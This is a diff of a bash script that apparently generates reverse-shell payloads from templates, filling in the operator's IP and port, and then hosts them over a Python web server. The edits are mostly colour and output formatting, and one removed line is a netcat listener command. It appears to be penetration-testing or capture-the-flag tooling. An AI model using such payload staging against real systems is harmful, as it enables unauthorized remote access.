@@ -14,13 +14,22 @@ iface='tun0'
 http_port=80
 msfvenom=''
 
+
+# colors!
+nc=$(tput sgr0) # No Color
+red=$(tput setaf 1)
+green=$(tput setaf 2)
+yellow=$(tput setaf 190)
+blue=$(tput setaf 4)
+grey=$(tput setaf 245)
+
 # parse command line args
 while [[ $# -gt 0 ]]; do
   case $1 in
     -h|--help)
       echo "$0 [-p LPORT] [-i IFACE] [-H HTTP_PORT] [-m lsr64.elf,wsr.c,...]" >&2
-      echo "  -p LPORT  specify local port for reverse shell" >&2
-      echo "  -i IFACE  specify interface to determine IP address, e.g. tun0 or eth0" >&2
+      echo "  -p LPORT      specify local port for reverse shell" >&2
+      echo "  -i IFACE      specify interface to determine IP address, e.g. tun0 or eth0" >&2
       echo "  -m SHELLTYPE  specify the kind of shell you want to generate, e.g." >&2
       echo "                lsr64.elf - linux shell reverse 64bit in elf format" >&2
       echo "                wsr.c     - windows shell reverse 32bit in c format" >&2
@@ -60,7 +69,8 @@ if [[ "$?" -ne "0" ]]; then
     exit 1
 fi
 lhost=$(ip address show $iface | grep -oP '(?<=inet )[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
-echo "lhost: $lhost"
+printf '%s\n' "${grey}LHOST: ${lhost}"
+printf '%s\n' "${grey}LPORT: ${lport}"
 
 this_dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
 files="${this_dir}/files"
@@ -74,7 +84,7 @@ template_dir="${this_dir}/templates"
 find "${template_dir}" -type f | while read filename
 do
     new_filename=${files}/$(basename ${filename})
-    echo "generating $new_filename"
+    printf '%s\n' "${grey}Generating $new_filename"
     cp $filename $new_filename
     sed -i "s/{{lhost}}/${lhost}/g" $new_filename
     sed -i "s/{{lport}}/${lport}/g" $new_filename
@@ -133,15 +143,11 @@ do
     esac
 done
 
-nc=$(tput sgr0) # No Color
-red=$(tput setaf 1)
-green=$(tput setaf 2)
-yellow=$(tput setaf 190)
-blue=$(tput setaf 4)
-
+printf "\n"
 printf $yellow; cat $win_tmp | sort | column; printf $nc
 printf $green; cat $lin_tmp | sort | column; printf $nc
 printf $blue; cat $oth_tmp | sort | column; printf $nc
+printf "\n"
 
 rm $win_tmp
 rm $lin_tmp
@@ -150,5 +156,5 @@ rm $oth_tmp
 ##########################################################
 #---------------) Host python webserver (----------------#
 ##########################################################
-echo "Your IP: ${lhost} - don't forget: $> nc -nlvp ${lport}"
+echo "Your IP: ${green}${lhost}${nc}"
 cd ${files} && python3 -m http.server $http_port
